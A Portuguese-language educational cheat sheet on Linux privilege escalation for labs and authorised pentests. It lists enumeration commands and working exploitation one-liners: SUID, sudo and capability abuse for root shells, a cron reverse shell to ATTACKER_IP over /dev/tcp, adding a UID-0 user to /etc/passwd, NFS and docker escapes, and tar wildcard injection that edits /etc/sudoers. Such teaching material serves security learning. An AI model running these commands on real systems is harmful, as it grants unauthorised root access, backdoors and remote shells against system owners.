# 🐧 Linux Privilege Escalation - Teoria Completa

> Guia educacional sobre escalação de privilégios no Linux

---

## 📚 O que é Privilege Escalation?

**Privilege Escalation** (PrivEsc) é o processo de elevar permissões de um usuário de baixo privilégio para root/administrator.

### Tipos
```
Vertical PrivEsc:
└─ user → root

Horizontal PrivEsc:
└─ user1 → user2 (mesmo nível)
```

⚠️ **Use apenas em ambientes autorizados (labs, CTFs, pentests aprovados)**

---

## 🔍 Enumeração Inicial

### Informações do Sistema
```bash
# Sistema operacional
uname -a
cat /etc/os-release
cat /etc/issue

# Versão do kernel (importante!)
uname -r
cat /proc/version

# Arquitetura
uname -m
dpkg --print-architecture
```

---

### Usuário Atual
```bash
# Quem sou eu?
whoami
id

# Grupos
groups
id -G

# Comandos permitidos como root (sudo)
sudo -l

# Histórico de comandos
history
cat ~/.bash_history
```

---

### Outros Usuários
```bash
# Listar usuários
cat /etc/passwd
cat /etc/passwd | grep -v "nologin" | grep -v "false"

# Usuários com UID 0 (root)
cat /etc/passwd | grep "x:0:"

# Usuários com shell válido
cat /etc/passwd | grep -E "/bin/(bash|sh|zsh)"

# Última vez que usuários fizeram login
lastlog
last
```

---

### Rede
```bash
# Interfaces
ifconfig
ip addr

# Conexões ativas
netstat -antup
ss -tulpn

# Portas abertas
netstat -an | grep LISTEN
ss -tlnp

# Tabela de roteamento
route -n
ip route
```

---

### Processos
```bash
# Processos em execução
ps aux
ps -ef

# Processos como root
ps aux | grep root

# Serviços
systemctl list-units --type=service
service --status-all
```

---

## 🎯 Vetores Comuns de PrivEsc

### 1. SUID/SGID Binaries

**Conceito:** Arquivos que executam com permissões do dono (mesmo quando executados por outro usuário)

```bash
# Encontrar SUID (user)
find / -perm -4000 -type f 2>/dev/null
find / -perm -u=s -type f 2>/dev/null

# Encontrar SGID (group)
find / -perm -2000 -type f 2>/dev/null
find / -perm -g=s -type f 2>/dev/null

# SUID e SGID
find / -perm -6000 -type f 2>/dev/null
```

**Binários SUID comuns explorables:**
```
/usr/bin/find
/usr/bin/vim
/usr/bin/nmap
/usr/bin/python
/bin/bash
/bin/sh
```

**Exemplo de exploração:**
```bash
# Se /usr/bin/find tem SUID como root:
find /etc/passwd -exec whoami \;
find /etc/passwd -exec /bin/bash -p \;

# Se /usr/bin/vim tem SUID:
vim -c ':!sh'

# Se python tem SUID:
python -c 'import os; os.execl("/bin/bash", "bash", "-p")'
```

**Referência:** [GTFOBins](https://gtfobins.github.io/)

---

### 2. Sudo Misconfigurations

```bash
# Verificar permissões sudo
sudo -l

# Exemplos de exploração:

# Se: (ALL) NOPASSWD: /usr/bin/find
sudo find /etc/passwd -exec /bin/bash \;

# Se: (ALL) NOPASSWD: /usr/bin/vim
sudo vim -c ':!sh'

# Se: (ALL) NOPASSWD: /usr/bin/python
sudo python -c 'import pty; pty.spawn("/bin/bash")'

# Se: (ALL) NOPASSWD: /usr/bin/less
sudo less /etc/passwd
# Dentro do less: !bash

# Se: (ALL) NOPASSWD: /usr/bin/awk
sudo awk 'BEGIN {system("/bin/bash")}'
```

**Sudo vulnerável (CVE-2021-3156):**
```bash
# Sudo < 1.9.5p2
sudoedit -s /
```

---

### 3. Capabilities

Linux capabilities permitem privilégios granulares.

```bash
# Encontrar capabilities
getcap -r / 2>/dev/null

# Exploração exemplo:
# Se python tem cap_setuid+ep:
python -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

**Capabilities perigosas:**
- `cap_setuid` - Mudar UID
- `cap_dac_read_search` - Bypass permissões de leitura
- `cap_dac_override` - Bypass todas permissões de arquivo

---

### 4. Cron Jobs

```bash
# Ver cron jobs
crontab -l
cat /etc/crontab
ls -la /etc/cron.*

# Procurar scripts executados pelo cron
grep -r "CRON" /var/log/

# Verificar se scripts são graváveis
ls -la /path/to/cron/script.sh
```

**Exploração:**
```bash
# Se script do cron é gravável:
echo "/bin/bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1" >> /path/to/script.sh
```

---

### 5. Writable /etc/passwd

```bash
# Verificar se /etc/passwd é gravável
ls -la /etc/passwd

# Se sim, adicionar usuário root:
echo 'hacker:x:0:0:root:/root:/bin/bash' >> /etc/passwd
# Ou com senha:
openssl passwd -1 -salt xyz password123
echo 'hacker:$1$xyz$HASH:0:0:root:/root:/bin/bash' >> /etc/passwd
su hacker
```

---

### 6. Kernel Exploits

```bash
# Verificar versão do kernel
uname -r

# Procurar exploits
searchsploit linux kernel $(uname -r)

# Exploits comuns:
# - Dirty COW (CVE-2016-5195)
# - Dirty Pipe (CVE-2022-0847)
# - PwnKit (CVE-2021-4034)
```

⚠️ **Kernel exploits podem crashar o sistema!**

---

### 7. NFS Shares

```bash
# Verificar exports
cat /etc/exports

# Se "no_root_squash" está presente:
# Mount remotamente e criar SUID bash
# No atacante:
mkdir /tmp/nfs
mount -t nfs VICTIM_IP:/share /tmp/nfs
cd /tmp/nfs
cp /bin/bash .
chmod +s bash
# Na vítima:
/share/bash -p
```

---

### 8. Docker Escape

```bash
# Verificar se está em grupo docker
groups
id

# Se sim:
docker run -v /:/mnt --rm -it alpine chroot /mnt sh
```

---

## 🛠️ Ferramentas de Enumeração

### LinPEAS
```bash
# Download e execução
wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh
```

### LinEnum
```bash
wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
chmod +x LinEnum.sh
./LinEnum.sh
```

### Linux Smart Enumeration (lse.sh)
```bash
wget https://github.com/diego-treitos/linux-smart-enumeration/releases/latest/download/lse.sh
chmod +x lse.sh
./lse.sh -l 1  # Nível 1 (rápido)
./lse.sh -l 2  # Nível 2 (detalhado)
```

---

## 🔐 Técnicas Adicionais

### Path Hijacking
```bash
# Se sudo permite comando sem caminho absoluto:
echo '/bin/bash' > /tmp/ls
chmod +x /tmp/ls
export PATH=/tmp:$PATH
sudo ls
```

### Library Hijacking
```bash
# Se LD_PRELOAD ou LD_LIBRARY_PATH permitido no sudo
# Criar biblioteca maliciosa
# Referência: HackTricks
```

### Wildcard Injection
```bash
# tar com wildcard em cron:
echo 'echo "user ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers' > /tmp/evil.sh
chmod +x /tmp/evil.sh
echo "" > "--checkpoint-action=exec=sh /tmp/evil.sh"
echo "" > --checkpoint=1
```

---

## 📋 Checklist de Enumeração

```
Sistema:
[ ] Versão do kernel
[ ] Distribuição Linux
[ ] Arquitetura
[ ] Patches instalados

Usuário:
[ ] Usuário atual e UID
[ ] Grupos
[ ] sudo -l
[ ] Histórico de comandos
[ ] SSH keys (~/.ssh/)

Rede:
[ ] Interfaces
[ ] Portas abertas
[ ] Conexões ativas
[ ] Outros hosts na rede

Arquivos:
[ ] SUID binaries
[ ] Writable /etc/passwd
[ ] Writable /etc/shadow
[ ] Capabilities
[ ] Cron jobs
[ ] NFS shares

Processos:
[ ] Processos como root
[ ] Serviços vulneráveis
[ ] Versões de software
```

---

## 💡 Dicas

### 1. Sempre Enumere
```
Gaste tempo na enumeração.
Quanto mais informação, melhor.
```

### 2. Múltiplos Caminhos
```
Geralmente há mais de um vetor.
Não desista no primeiro bloqueio.
```

### 3. Documente
```
Salve outputs de comandos.
Você pode precisar revisitar.
```

### 4. Reverta Mudanças
```
Em produção (com autorização):
Reverta mudanças após o teste.
```

---

## 📚 Recursos

### Guias
- [HackTricks - Linux PrivEsc](https://book.hacktricks.xyz/linux-hardening/privilege-escalation)
- [GTFOBins](https://gtfobins.github.io/)
- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings)

### Labs Práticos
- HackTheBox
- TryHackMe - Linux PrivEsc Room
- OverTheWire - Bandit

---

<div align="center">

**🐧 Enumeração é a chave**

*90% do PrivEsc é encontrar, 10% é explorar*

---

*Conteúdo educacional | Use apenas em ambientes autorizados*

</div>
